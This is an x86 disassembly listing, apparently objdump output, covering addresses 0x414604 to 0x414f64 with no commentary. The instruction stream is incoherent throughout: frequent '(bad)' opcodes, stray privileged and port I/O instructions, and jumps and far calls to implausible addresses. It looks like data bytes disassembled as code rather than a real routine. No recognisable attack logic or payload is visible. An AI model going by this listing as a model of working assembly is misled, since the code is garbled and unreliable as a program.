  414604:	pushf  
  414605:	mov    ds:0xb45eeb1c,eax
  41460a:	nop
  41460b:	test   BYTE PTR [esi-0x22b46a15],cl
  414611:	dec    edi
  414612:	outs   dx,BYTE PTR ds:[esi]
  414613:	inc    ecx
  414614:	int3   
  414615:	repz lahf 
  414617:	in     al,0x3f
  414619:	lods   eax,DWORD PTR gs:[esi]
  41461b:	fdivr  DWORD PTR [ecx-0x26]
  41461e:	inc    edx
  41461f:	adc    ah,ch
  414621:	lods   al,BYTE PTR ds:[esi]
  414622:	ins    BYTE PTR es:[edi],dx
  414623:	xchg   ebx,eax
  414624:	mov    edi,0xf04d3895
  414629:	jp     0x414698
  41462b:	adc    eax,0x99452442
  414630:	mov    ds:0x3c7cfc21,al
  414635:	jecxz  0x41464f
  414637:	inc    ch
  414639:	adc    ebp,edx
  41463b:	mov    BYTE PTR [ebp-0xe7ca12],ah
  414641:	inc    edx
  414642:	aad    0x70
  414644:	lods   al,BYTE PTR ds:[esi]
  414645:	ins    BYTE PTR es:[edi],dx
  414646:	pop    esi
  414647:	fsubr  DWORD PTR ds:0x6f2b180f
  41464d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464e:	xchg   esp,eax
  41464f:	add    eax,0xb452c2da
  414654:	push   0xffffffa6
  414656:	popa   
  414657:	scas   al,BYTE PTR es:[edi]
  414658:	(bad)  
  414659:	imul   edx,DWORD PTR ss:[eax],0xffffffc1
  41465d:	xchg   ebp,eax
  41465e:	fist   WORD PTR [eax-0x16]
  414661:	ficom  DWORD PTR [edi-0x50]
  414664:	mov    WORD PTR [ecx+edx*4],?
  414667:	pop    edx
  414668:	mov    eax,ds:0x15e1b8aa
  41466d:	daa    
  41466e:	repz and bh,dh
  414671:	or     DWORD PTR [ebx+eax*2-0x2e],ebp
  414675:	xor    DWORD PTR [edx-0x42],ebp
  414678:	dec    ebx
  414679:	jmp    0x80ffe607
  41467e:	in     al,0xa2
  414680:	call   0x602026a9
  414685:	lea    edi,[ecx+ebp*2-0x52]
  414689:	mov    al,ds:0x3274ed5
  41468e:	mov    bh,0xcc
  414690:	shr    BYTE PTR [ebp-0x5b483524],cl
  414696:	push   ds
  414697:	add    DWORD PTR [edi+0x79d9ce72],ebx
  41469d:	xchg   ebx,eax
  41469e:	jnp    0x414663
  4146a0:	add    ebx,DWORD PTR [ebx-0x16]
  4146a3:	mov    ecx,0xd615edb7
  4146a8:	(bad)  
  4146a9:	push   ebp
  4146aa:	loopne 0x414714
  4146ac:	dec    esp
  4146ad:	add    eax,0xeb0f87a3
  4146b2:	cmp    eax,0xaee3c16a
  4146b7:	pop    esi
  4146b8:	ds out 0x36,al
  4146bb:	push   es
  4146bc:	mov    eax,ds:0x234d2f15
  4146c1:	and    cl,ah
  4146c3:	inc    ebp
  4146c4:	pop    ebx
  4146c5:	test   eax,0xfd1790c0
  4146ca:	or     DWORD PTR [ebx+0x41f47abc],edx
  4146d0:	sub    DWORD PTR [ebx+0x6],0xffffffc4
  4146d4:	ins    DWORD PTR es:[edi],dx
  4146d5:	mov    edx,DWORD PTR [edi]
  4146d7:	dec    edi
  4146d8:	add    eax,0xcf62182e
  4146dd:	out    dx,eax
  4146de:	in     eax,0xdd
  4146e0:	gs and eax,0x842809ca
  4146e6:	clc    
  4146e7:	push   es
  4146e8:	jmp    0x595950b4
  4146ed:	fcomp  st(6)
  4146ef:	loop   0x4146c0
  4146f1:	sbb    eax,0xe7217a2f
  4146f6:	inc    eax
  4146f7:	aas    
  4146f8:	xchg   ecx,eax
  4146f9:	and    eax,0x54ec70cf
  4146fe:	fs jecxz 0x414746
  414701:	(bad)  
  414702:	std    
  414703:	fnstcw WORD PTR [edi-0x58]
  414706:	mov    al,ds:0x9ecb5c6e
  41470b:	repz mov gs,WORD PTR [ecx+eiz*2]
  41470f:	dec    eax
  414710:	out    0x83,eax
  414712:	fmul   DWORD PTR [esi+0x7d38a8c4]
  414718:	icebp  
  414719:	stos   BYTE PTR es:[edi],al
  41471a:	shr    DWORD PTR [esp+edi*2-0x58391e9],cl
  414721:	jge    0x4146c8
  414723:	push   0x661d557e
  414728:	leave  
  414729:	cmp    ah,bl
  41472b:	cmp    al,0x4c
  41472d:	fwait
  41472e:	jp     0x41470d
  414730:	push   esi
  414731:	sbb    al,BYTE PTR [ebp+edx*4+0x72e5e1bf]
  414738:	(bad)  
  414739:	fild   WORD PTR [esi-0x68f30ec6]
  41473f:	mov    BYTE PTR [edi+0x38b75bb7],dh
  414745:	ja     0x414721
  414747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414748:	dec    esp
  414749:	xor    al,0xff
  41474b:	xchg   ebp,ecx
  41474d:	mov    ds:0xd615923b,al
  414752:	push   ecx
  414753:	xlat   BYTE PTR ds:[ebx]
  414754:	xchg   edx,edi
  414756:	jp     0x414776
  414758:	stc    
  414759:	ror    BYTE PTR [edx+edx*4+0x73],1
  41475d:	addr16 ja 0x41479c
  414760:	out    dx,eax
  414761:	dec    edx
  414762:	das    
  414763:	push   edx
  414764:	push   0x66223da8
  414769:	setl   bl
  41476c:	out    dx,eax
  41476d:	inc    edx
  41476e:	fbld   TBYTE PTR [eax+0x4a]
  414771:	jge    0x4147e8
  414773:	imul   esp,esp,0xd228b779
  414779:	mov    bh,0xfd
  41477b:	push   esp
  41477c:	adc    BYTE PTR [esp+ecx*8],ch
  41477f:	enter  0x85d8,0xb3
  414783:	xchg   BYTE PTR [ebp+0x38],bh
  414786:	push   esi
  414787:	inc    ecx
  414788:	ficomp DWORD PTR [ebx+0x6e620454]
  41478e:	push   esp
  41478f:	and    al,0xd
  414791:	add    dh,BYTE PTR [edx+0x14ba2107]
  414797:	jo     0x414726
  414799:	push   0xbd468f2
  41479e:	dec    ecx
  41479f:	and    BYTE PTR [ebp-0x12],dh
  4147a2:	xchg   esi,eax
  4147a3:	stos   BYTE PTR es:[edi],al
  4147a4:	or     eax,0x424ccd21
  4147a9:	or     eax,ecx
  4147ab:	cli    
  4147ac:	scas   eax,DWORD PTR es:[edi]
  4147ad:	sbb    ecx,DWORD PTR [ebx]
  4147af:	gs mov bh,0x70
  4147b2:	fistp  WORD PTR [eax]
  4147b4:	stc    
  4147b5:	inc    esi
  4147b6:	xor    BYTE PTR [edi-0xfd60bea],dh
  4147bc:	pop    ds
  4147bd:	and    ch,BYTE PTR [esi+0x9e5f]
	...
  41498f:	add    BYTE PTR [eax],al
  414991:	in     eax,dx
  414992:	jle    0x414986
  414994:	ret    
  414995:	repz iret 
  414997:	std    
  414998:	jle    0x414979
  41499a:	loope  0x4149de
  41499c:	mov    al,0xa9
  41499e:	jnp    0x414940
  4149a0:	add    BYTE PTR [ebx+0x20000161],bl
  4149a6:	pop    es
  4149a7:	add    BYTE PTR [eax],al
  4149a9:	lahf   
  4149aa:	aaa    
  4149ab:	xchg   edx,eax
  4149ac:	adc    eax,0xec3e7262
  4149b1:	xchg   edi,eax
  4149b2:	ss mov edi,0xe3f41ee2
  4149b8:	lock mov esp,0x1ba8f483
  4149be:	fmul   DWORD PTR [edi]
  4149c0:	rol    DWORD PTR [esi+ecx*4+0x2942c1a8],1
  4149c7:	clc    
  4149c8:	push   ss
  4149c9:	dec    eax
  4149ca:	rcr    BYTE PTR [ebp-0x58],0x58
  4149ce:	pop    es
  4149cf:	enter  0xc289,0xfa
  4149d3:	sbb    dl,BYTE PTR [edx]
  4149d5:	aaa    
  4149d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d7:	inc    esp
  4149d8:	and    eax,0x4a33a5bf
  4149dd:	call   0x9ddb:0xc626be81
  4149e4:	jo     0x414a08
  4149e6:	sub    DWORD PTR [ebp+edi*4-0x1ee6421],edx
  4149ed:	inc    edi
  4149ee:	fistp  DWORD PTR ds:[ebp-0x7b]
  4149f2:	push   esp
  4149f3:	in     al,dx
  4149f4:	inc    esi
  4149f5:	and    DWORD PTR [ebx+esi*4],edx
  4149f8:	xor    DWORD PTR [esp+ebp*1-0x28784142],0xa18802b1
  414a03:	pop    es
  414a04:	push   edx
  414a05:	mov    ebx,0xebdf4b8b
  414a0a:	pop    edi
  414a0b:	add    al,0x30
  414a0d:	push   edx
  414a0e:	ror    BYTE PTR [ebp-0x59],cl
  414a11:	push   ebx
  414a12:	sub    DWORD PTR [edx],edi
  414a14:	xor    ebx,edx
  414a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a17:	fadd   st,st(7)
  414a19:	lods   al,BYTE PTR ds:[esi]
  414a1a:	jnp    0x414a76
  414a1c:	cs mov ss,ebx
  414a1f:	adc    al,0x43
  414a21:	dec    ecx
  414a22:	mov    edx,DWORD PTR [ebx-0x4d]
  414a25:	sahf   
  414a26:	and    DWORD PTR [ecx],ecx
  414a28:	sbb    bl,bl
  414a2a:	cdq    
  414a2b:	cmp    eax,0xf0931317
  414a30:	mov    cl,0xdc
  414a32:	leave  
  414a33:	inc    ebx
  414a34:	fcomip st,st(7)
  414a36:	mov    dl,0x6a
  414a38:	aam    0x1f
  414a3a:	mov    bh,0xe5
  414a3c:	sub    ch,dl
  414a3e:	ss mov bl,0xd8
  414a41:	push   ss
  414a42:	cmp    al,BYTE PTR [ecx]
  414a44:	sbb    ebp,DWORD PTR es:[esi]
  414a47:	dec    ebp
  414a48:	mov    DWORD PTR [edx+edx*2+0x3c],edx
  414a4c:	stc    
  414a4d:	scas   eax,DWORD PTR es:[edi]
  414a4e:	(bad)  
  414a4f:	cmp    dl,bl
  414a51:	mov    dl,0x4b
  414a53:	or     ah,al
  414a55:	xor    al,0x5f
  414a57:	jae    0x414aab
  414a59:	ins    DWORD PTR es:[edi],dx
  414a5a:	sar    BYTE PTR [ebp+ecx*4+0x36],cl
  414a5e:	es add al,0x3a
  414a61:	mov    ah,0x49
  414a63:	pop    esp
  414a64:	sbb    BYTE PTR [edi-0x6ebcd76c],dl
  414a6a:	lock neg DWORD PTR [edx]
  414a6d:	sub    BYTE PTR [esp+eax*4+0x40],dl
  414a71:	test   ch,ah
  414a73:	inc    esi
  414a74:	sbb    DWORD PTR [edi-0x47],edi
  414a77:	adc    cl,BYTE PTR gs:[esi+0x9d7b553]
  414a7e:	mov    ah,0x5a
  414a80:	add    al,dl
  414a82:	call   0xe494:0xee65e87
  414a89:	std    
  414a8a:	ret    0x3eb2
  414a8d:	test   al,0x22
  414a8f:	mov    esp,0xb76df009
  414a94:	cli    
  414a95:	iret   
  414a96:	repz test DWORD PTR [ecx+0x210c5c53],esi
  414a9d:	fnstcw WORD PTR [esp+eax*8-0x29]
  414aa1:	push   ds
  414aa2:	loopne 0x414a8b
  414aa4:	in     al,0x55
  414aa6:	dec    ebx
  414aa7:	push   edi
  414aa8:	repnz fcom DWORD PTR [ebp+0x6d0d4fb0]
  414aaf:	fcomp  QWORD PTR [ebx]
  414ab1:	mov    eax,ds:0x94d67e7e
  414ab6:	push   ebx
  414ab7:	xor    BYTE PTR [eax+ebx*8+0x73],bl
  414abb:	mov    cl,0x9a
  414abd:	scas   al,BYTE PTR es:[edi]
  414abe:	aas    
  414abf:	addr16 push edx
  414ac1:	jge    0x414b0d
  414ac3:	jno    0x414aed
  414ac5:	scas   al,BYTE PTR es:[edi]
  414ac6:	add    esp,edx
  414ac8:	mov    al,0x59
  414aca:	adc    bh,BYTE PTR [edi-0x3c560c73]
  414ad0:	or     DWORD PTR [esp+ecx*2-0x6b2543ec],edi
  414ad7:	sbb    ebp,DWORD PTR [esi]
  414ad9:	mov    edi,0x206a8bc7
  414ade:	mov    edx,0xad889da9
  414ae3:	clc    
  414ae4:	xchg   edi,eax
  414ae5:	retf   0xe5e2
  414ae8:	mov    ch,0x80
  414aea:	in     eax,0xfc
  414aec:	xor    al,0x56
  414aee:	cmp    al,0x5f
  414af0:	cmp    DWORD PTR [edi-0x53],0x9c82601b
  414af7:	push   0xa4a97a44
  414afc:	jo     0x414a96
  414afe:	xor    DWORD PTR [eax],edi
  414b00:	daa    
  414b01:	or     eax,0x42335ed8
  414b06:	sub    al,0x48
  414b08:	pop    ds
  414b09:	sbb    eax,0x3fe59970
  414b0e:	jo     0x414ac3
  414b10:	(bad)  
  414b12:	popf   
  414b13:	hlt    
  414b14:	aaa    
  414b15:	in     al,0x85
  414b17:	in     al,dx
  414b18:	int    0x7
  414b1a:	pusha  
  414b1b:	out    dx,eax
  414b1c:	fist   DWORD PTR [ebp-0xd4c3fce]
  414b22:	pop    ds
  414b23:	cmp    eax,0x20ac38b9
  414b28:	inc    edi
  414b29:	mov    eax,DWORD PTR [ebx-0x2c9de4a]
  414b2f:	popa   
  414b30:	arpl   WORD PTR ds:0xbf3eaa43,di
  414b36:	cmp    edx,esp
  414b38:	sahf   
  414b39:	jnp    0x414b35
  414b3b:	fild   WORD PTR [ecx-0x35]
  414b3e:	adc    dl,BYTE PTR [edi+0x130c4787]
  414b44:	pop    eax
  414b45:	fwait
  414b46:	xchg   BYTE PTR [edi+0x9],ah
  414b49:	mov    bl,0xcf
  414b4b:	iret   
  414b4c:	dec    edi
  414b4d:	mov    dh,0xd4
  414b4f:	inc    ecx
  414b50:	jecxz  0x414b1f
  414b52:	pop    edi
  414b53:	cmp    edx,DWORD PTR [ebx+0x308601d3]
  414b59:	push   ecx
  414b5a:	jle    0x414bd6
  414b5c:	xor    esi,DWORD PTR [ebp-0x2f]
  414b5f:	rcl    BYTE PTR [eax+0x14],cl
  414b62:	mov    ds:0xf8321076,al
  414b67:	and    dh,BYTE PTR [edx]
  414b69:	cmp    ebx,DWORD PTR fs:[ebx]
  414b6c:	or     al,0x71
  414b6e:	adc    eax,0xfba391e1
  414b73:	mov    esp,0x82b1a5eb
  414b78:	ds jp  0x414b43
  414b7b:	xor    DWORD PTR [esi+0x42],esp
  414b7e:	lods   eax,DWORD PTR ds:[esi]
  414b7f:	sub    eax,0x55f91dbe
  414b84:	xchg   edi,eax
  414b85:	push   esi
  414b86:	cmp    esi,0xee9c702e
  414b8c:	je     0x414c0a
  414b8e:	out    0xee,eax
  414b90:	test   al,0x80
  414b92:	gs (bad) 
  414b94:	sub    DWORD PTR [ecx+ecx*8],ebx
  414b97:	fbld   TBYTE PTR [edx]
  414b99:	mov    edi,0xa52cba7c
  414b9e:	sbb    al,0x54
  414ba0:	add    ebx,DWORD PTR [edi]
  414ba2:	repnz xchg edx,eax
  414ba4:	fild   QWORD PTR [eax+0x8]
  414ba7:	test   al,0xb5
  414ba9:	outs   dx,DWORD PTR ds:[esi]
  414baa:	test   BYTE PTR [eax-0x5],bl
  414bad:	jl     0x414b90
  414baf:	sbb    esi,DWORD PTR [ebx+0x74]
  414bb2:	xor    DWORD PTR [eax+ebx*1],ebp
  414bb5:	aaa    
  414bb6:	mov    al,0x88
  414bb8:	addr16 mov al,0xc7
  414bbb:	loop   0x414b61
  414bbd:	lock mov ebp,0x948dfe68
  414bc3:	mov    ds:0x208c18ec,eax
  414bc8:	ficom  WORD PTR [ebp+0x4336c904]
  414bce:	sub    edx,DWORD PTR [ebx+0x26]
  414bd1:	inc    eax
  414bd2:	pop    edx
  414bd3:	pop    eax
  414bd4:	sub    ebp,DWORD PTR [eax+0x4fde23a]
  414bda:	out    0x16,eax
  414bdc:	push   ebx
  414bdd:	mov    al,ds:0x8722a701
  414be2:	mov    al,ds:0xfdf8ad6e
  414be7:	sbb    al,bh
  414be9:	sub    BYTE PTR [eax-0x33],ah
  414bec:	js     0x414b77
  414bee:	mov    eax,edx
  414bf0:	pop    edx
  414bf1:	pop    ebx
  414bf2:	cmc    
  414bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bf4:	push   0xffffff82
  414bf6:	scas   eax,DWORD PTR es:[edi]
  414bf7:	sub    BYTE PTR ds:0xf15428f2,al
  414bfd:	out    0x0,eax
  414bff:	adc    dh,BYTE PTR [eax]
  414c01:	mov    bh,0x1
  414c03:	ret    0x7f77
  414c06:	inc    esi
  414c07:	push   0xffffff8e
  414c09:	fidivr WORD PTR [edi+0x18]
  414c0c:	hlt    
  414c0d:	lods   eax,DWORD PTR ds:[esi]
  414c0e:	mov    BYTE PTR [eax-0x44],dl
  414c11:	clc    
  414c12:	fucomp st(6)
  414c14:	fmul   DWORD PTR [eax-0x67]
  414c17:	shl    BYTE PTR [eax],0xe3
  414c1a:	pop    esi
  414c1b:	push   ebx
  414c1c:	and    bh,cl
  414c1e:	xchg   edx,eax
  414c1f:	imul   edx,esi,0xa386fe57
  414c25:	out    0x50,al
  414c27:	test   al,0x5c
  414c29:	(bad)  
  414c2a:	pmaddwd mm4,mm0
  414c2d:	lods   eax,DWORD PTR ds:[esi]
  414c2e:	sbb    cl,BYTE PTR [edx+ebx*1-0x50]
  414c32:	adc    al,0xa3
  414c34:	in     al,0x57
  414c36:	mov    edx,0xbfa4c201
  414c3b:	pop    eax
  414c3c:	mov    esp,DWORD PTR [esi+0x7a8ed962]
  414c42:	scas   eax,DWORD PTR es:[edi]
  414c43:	(bad)  
  414c44:	pop    esp
  414c45:	dec    BYTE PTR [edx+0x62]
  414c48:	and    DWORD PTR [ebx-0x3610a73d],ecx
  414c4e:	sbb    al,0x25
  414c50:	push   edx
  414c51:	jmp    0x414c1a
  414c53:	ret    0x931a
  414c56:	out    0xdf,al
  414c58:	xchg   ebp,eax
  414c59:	jnp    0x414bdd
  414c5b:	fcom   DWORD PTR [ebx]
  414c5d:	mov    eax,0xdf96177b
  414c62:	adc    esp,esi
  414c64:	push   es
  414c65:	neg    DWORD PTR [eax+0x6124afd5]
  414c6b:	jne    0x414c3d
  414c6d:	pusha  
  414c6e:	push   0xea840fbc
  414c73:	xor    ebp,DWORD PTR [edx+edx*1+0x26]
  414c77:	and    bh,bl
  414c79:	inc    eax
  414c7a:	int    0xd3
  414c7c:	inc    edx
  414c7d:	daa    
  414c7e:	ror    DWORD PTR [esi+0xa],1
  414c81:	inc    ebp
  414c82:	es jp  0x414cbb
  414c85:	jo     0x414cb6
  414c87:	mov    esp,0x51eaa1e6
  414c8c:	xor    DWORD PTR [ebp+0x334040bf],esi
  414c92:	not    BYTE PTR [eax+0x26]
  414c95:	xor    eax,0x2e919b2d
  414c9a:	mov    edi,0x1d551cf9
  414c9f:	in     eax,dx
  414ca0:	xor    eax,0xb4204495
  414ca5:	retf   
  414ca6:	mov    ah,0xf2
  414ca8:	or     al,0xbe
  414caa:	xor    bl,BYTE PTR [esi+0x1cb595b2]
  414cb0:	test   eax,0x170fa452
  414cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb6:	sub    al,0xf5
  414cb8:	xchg   ecx,eax
  414cb9:	sub    al,0x18
  414cbb:	sbb    eax,DWORD PTR [esi+eiz*2-0x56]
  414cbf:	pop    eax
  414cc0:	fwait
  414cc1:	and    ebp,DWORD PTR [esi]
  414cc3:	xor    ebx,DWORD PTR [ebp+0x58]
  414cc6:	sub    DWORD PTR [edx-0x2b],edi
  414cc9:	mov    ebp,0x23c90a51
  414cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ccf:	sub    DWORD PTR [esi+0x32],esp
  414cd2:	cs or  BYTE PTR es:[edx],bl
  414cd6:	(bad)  
  414cd7:	loop   0x414c72
  414cd9:	inc    ecx
  414cda:	loop   0x414d16
  414cdc:	ds pop esi
  414cde:	hlt    
  414cdf:	lahf   
  414ce0:	aam    0x98
  414ce2:	sbb    BYTE PTR [ebp-0x47448422],ah
  414ce8:	pop    esi
  414ce9:	ret    
  414cea:	cmp    cl,cl
  414cec:	jb     0x414d50
  414cee:	scas   al,BYTE PTR es:[edi]
  414cef:	or     al,bl
  414cf1:	fs repz bnd jg 0x414d31
  414cf6:	mov    ds:0xf4c68d5f,eax
  414cfb:	sbb    DWORD PTR [edi],ecx
  414cfd:	jg     0x414cc4
  414cff:	dec    ecx
  414d00:	jnp    0x414c92
  414d02:	icebp  
  414d03:	jo     0x414cdc
  414d05:	and    BYTE PTR [eax+0x79],al
  414d08:	shl    BYTE PTR [ebx],cl
  414d0a:	and    esi,ecx
  414d0c:	aad    0x3b
  414d0e:	push   edi
  414d0f:	shl    ah,1
  414d11:	mov    dh,0x3b
  414d13:	push   eax
  414d14:	nop
  414d15:	lods   al,BYTE PTR ds:[esi]
  414d16:	xor    DWORD PTR [ebp+0x69],0x63
  414d1a:	jg     0x414d8a
  414d1c:	and    dl,dh
  414d1e:	repz icebp 
  414d20:	xchg   esi,eax
  414d21:	jmp    0x189efee7
  414d26:	arpl   dx,dx
  414d28:	xchg   bl,bl
  414d2a:	jbe    0x414d55
  414d2c:	retf   
  414d2d:	push   ss
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    al,ds:0xdaa10264
  414d34:	std    
  414d35:	jecxz  0x414d4c
  414d37:	movlps xmm7,QWORD PTR [edi]
  414d3a:	lock cli 
  414d3c:	push   eax
  414d3d:	fcmovne st,st(4)
  414d3f:	out    0xb6,al
  414d41:	frstor [ebp+edx*1+0x7]
  414d45:	xlat   BYTE PTR ds:[ebx]
  414d46:	(bad)  
  414d49:	pop    ecx
  414d4a:	or     DWORD PTR [eax+0x303ca9c4],ebx
  414d50:	outs   dx,BYTE PTR ds:[esi]
  414d51:	jo     0x414d7e
  414d53:	jae    0x414d1f
  414d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d56:	fnstcw WORD PTR [edx+0x352a43f6]
  414d5c:	mov    eax,0xcd1c71c9
  414d61:	sahf   
  414d62:	inc    ebp
  414d63:	cmp    BYTE PTR [edx+0x55ee2ed6],0xe5
  414d6a:	adc    eax,ebx
  414d6c:	sbb    bh,bh
  414d6e:	clc    
  414d6f:	push   eax
  414d70:	pop    ebx
  414d71:	scas   eax,DWORD PTR es:[edi]
  414d72:	mov    bh,0x69
  414d74:	aad    0x3c
  414d76:	sbb    al,0xe7
  414d78:	add    bh,BYTE PTR [edx+0x5b]
  414d7b:	sbb    al,0xfe
  414d7d:	or     DWORD PTR [ebx+0x2e],eax
  414d80:	shr    DWORD PTR [ecx-0x5b91a1c9],0x2a
  414d87:	sar    edx,1
  414d89:	adc    DWORD PTR [edi+0x33],0xd8606cec
  414d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d91:	adc    al,0xe5
  414d93:	retf   0xeb24
  414d96:	pop    eax
  414d97:	pop    esi
  414d98:	ins    DWORD PTR es:[edi],dx
  414d99:	mov    ecx,0x8dee1c91
  414d9e:	enter  0xfea5,0xe9
  414da2:	mov    al,ds:0xcb361244
  414da7:	in     al,0xc3
  414da9:	icebp  
  414daa:	(bad)
  414dad:	cli    
  414dae:	int3   
  414daf:	gs and al,0x9b
  414db2:	enter  0x100b,0x43
  414db6:	or     eax,0x7cafb1bb
  414dbb:	cmp    eax,0xaeee0229
  414dc0:	mov    ecx,0xbde4cb4e
  414dc5:	xchg   ecx,eax
  414dc6:	ja     0x414e26
  414dc8:	aad    0xdc
  414dca:	pop    ebp
  414dcb:	mov    esp,0x8d460765
  414dd0:	or     ebp,ebp
  414dd2:	leave  
  414dd3:	iret   
  414dd4:	pushf  
  414dd5:	pop    edi
  414dd6:	test   BYTE PTR [eax],cl
  414dd8:	std    
  414dd9:	pop    esp
  414dda:	cmp    edx,edx
  414ddc:	inc    edx
  414ddd:	xchg   esi,eax
  414dde:	int3   
  414ddf:	dec    edx
  414de0:	int    0xe3
  414de2:	adc    DWORD PTR cs:[ebx+edi*8+0x60],esi
  414de7:	int    0x3c
  414de9:	xchg   ebp,eax
  414dea:	xor    edi,DWORD PTR [ebx]
  414dec:	setne  dl
  414def:	inc    ecx
  414df0:	das    
  414df1:	push   es
  414df2:	cmp    ah,ch
  414df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df5:	mov    al,ds:0xdd32bf58
  414dfa:	fisubr DWORD PTR [eax-0x39]
  414dfd:	les    esi,FWORD PTR [edi-0x75]
  414e00:	rcl    al,0xff
  414e03:	jbe    0x414e7c
  414e05:	inc    eax
  414e06:	or     bh,al
  414e08:	xlat   BYTE PTR ds:[ebx]
  414e09:	mov    edi,0xa0e05afa
  414e0e:	mov    WORD PTR [edx+0x35],gs
  414e11:	pusha  
  414e12:	jb     0x414e3a
  414e14:	cmp    cl,cl
  414e16:	add    DWORD PTR [ebx+0x3c4fbacd],esp
  414e1c:	fisttp QWORD PTR [ebp-0x3b2bc670]
  414e22:	jno    0x414e55
  414e24:	mov    DWORD PTR [ebx],eax
  414e26:	mov    ds:0x2c4d4c7a,al
  414e2b:	cmp    DWORD PTR [edi+0x1b608d12],ecx
  414e31:	ds dec eax
  414e33:	sbb    eax,0xe4b833a5
  414e38:	pusha  
  414e39:	inc    ebx
  414e3a:	mov    al,0x12
  414e3c:	loope  0x414e3f
  414e3e:	retf   0x8ed0
  414e41:	inc    ebx
  414e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e43:	mov    esi,0xce8fec10
  414e48:	test   BYTE PTR [edi+0x5f311e9],ch
  414e4e:	dec    eax
  414e4f:	rcl    DWORD PTR [edi],1
  414e51:	inc    edi
  414e52:	lds    ebp,FWORD PTR [ebp+0x291140d1]
  414e58:	sbb    al,0x3a
  414e5a:	and    BYTE PTR [edi],dh
  414e5c:	into   
  414e5d:	int3   
  414e5e:	mov    dl,0x5b
  414e60:	bound  eax,QWORD PTR [edx-0x4f]
  414e63:	pop    ss
  414e64:	jge    0x414ed1
  414e66:	push   eax
  414e67:	adc    eax,0x4028009a
  414e6c:	mov    dl,0xe
  414e6e:	mov    bh,0xaa
  414e70:	push   ss
  414e71:	rcl    DWORD PTR fs:[edi],1
  414e74:	into   
  414e75:	jge    0x414e8a
  414e77:	xchg   edi,eax
  414e78:	mov    bh,0xb4
  414e7a:	adc    BYTE PTR [ecx+0x34],bh
  414e7d:	dec    eax
  414e7e:	gs data16 mov cl,0x47
  414e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e83:	push   es
  414e84:	cmp    dh,BYTE PTR [edx]
  414e86:	fwait
  414e87:	mov    dl,0xce
  414e89:	add    BYTE PTR fs:[ebp-0x31],ah
  414e8d:	aam    0x65
  414e8f:	mov    dl,0x7e
  414e91:	dec    ebp
  414e92:	mov    al,0x9d
  414e94:	cwde   
  414e95:	or     DWORD PTR [edi-0x17],ebp
  414e98:	push   esp
  414e99:	dec    esp
  414e9a:	and    eax,0x1fd6bb57
  414e9f:	lea    esp,[esi]
  414ea1:	mov    bl,0x2b
  414ea3:	mov    bl,0x5e
  414ea5:	and    eax,0xfb50d08e
  414eaa:	in     eax,0x1
  414eac:	cmp    BYTE PTR [eax-0x27],dl
  414eaf:	jae    0x414eaa
  414eb1:	push   ebp
  414eb2:	and    edi,edi
  414eb4:	mov    ecx,0xbfa216c
  414eb9:	push   edx
  414eba:	mov    ss,WORD PTR [esi+ecx*1]
  414ebd:	sub    DWORD PTR [ebx-0x30],ecx
  414ec0:	push   es
  414ec1:	xchg   ebx,eax
  414ec2:	idiv   DWORD PTR [edx-0x2152fa59]
  414ec8:	inc    edi
  414ec9:	adc    esp,0x38
  414ecc:	xchg   esi,eax
  414ecd:	add    dh,ch
  414ecf:	test   al,0xf3
  414ed1:	cs ret 0xe8eb
  414ed5:	aad    0xad
  414ed7:	fld    QWORD PTR [ecx]
  414ed9:	pop    ds
  414eda:	dec    edx
  414edb:	data16 (bad) 
  414edd:	mov    bl,0x5a
  414edf:	out    dx,al
  414ee0:	aas    
  414ee1:	sub    DWORD PTR [esi-0x343a8bfc],esi
  414ee7:	shl    DWORD PTR [esi+0x37],1
  414eea:	addr16 inc eax
  414eec:	je     0x414f60
  414eee:	dec    esp
  414eef:	(bad)  
  414ef0:	cmp    dl,BYTE PTR [edi+eax*2-0x5b]
  414ef4:	xchg   edx,eax
  414ef5:	ret    
  414ef6:	frstor [ebp-0x580f6469]
  414efc:	sub    DWORD PTR [ebx+0x5e],0x9e0246b0
  414f03:	add    ecx,ebp
  414f05:	or     al,0x4a
  414f07:	ret    
  414f08:	and    eax,0x50605fff
  414f0d:	push   esp
  414f0e:	test   eax,0xe43cdeb9
  414f13:	mov    ch,0x1a
  414f15:	inc    esi
  414f16:	ret    
  414f17:	lods   al,BYTE PTR ds:[esi]
  414f18:	pushf  
  414f19:	(bad)  
  414f1a:	jno    0x414f87
  414f1c:	fisttp QWORD PTR [esi]
  414f1e:	or     bl,BYTE PTR [edi]
  414f20:	clc    
  414f21:	add    al,0xf9
  414f23:	xchg   edx,eax
  414f24:	fwait
  414f25:	es loop 0x414f32
  414f28:	pop    esi
  414f29:	dec    esp
  414f2a:	out    0x96,al
  414f2c:	inc    ebx
  414f2d:	shr    ecx,0xbb
  414f30:	push   esp
  414f31:	cmp    DWORD PTR cs:[ecx+edx*4-0x5],ebp
  414f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f37:	into   
  414f38:	ret    
  414f39:	xchg   edx,eax
  414f3a:	lods   eax,DWORD PTR ds:[esi]
  414f3b:	int3   
  414f3c:	fild   WORD PTR [edi-0x4c]
  414f3f:	pusha  
  414f40:	aas    
  414f41:	add    BYTE PTR [edx],ch
  414f43:	inc    ecx
  414f44:	jne    0x414fa4
  414f46:	cld    
  414f47:	push   esp
  414f48:	or     BYTE PTR [esi-0x5cdac882],ah
  414f4e:	xchg   esp,eax
  414f4f:	pop    ds
  414f50:	dec    edi
  414f51:	jne    0x414f46
  414f53:	mov    bh,0x4b
  414f55:	stos   DWORD PTR es:[edi],eax
  414f56:	cwde   
  414f57:	mov    cl,0x9f
  414f59:	(bad)  
  414f5b:	pop    esp
  414f5c:	push   edi
  414f5d:	fsubr  QWORD PTR [ebx+0x606a957c]
  414f63:	push   ds
  414f64:	mov    edx,DWORD PTR [ebx+0x27]
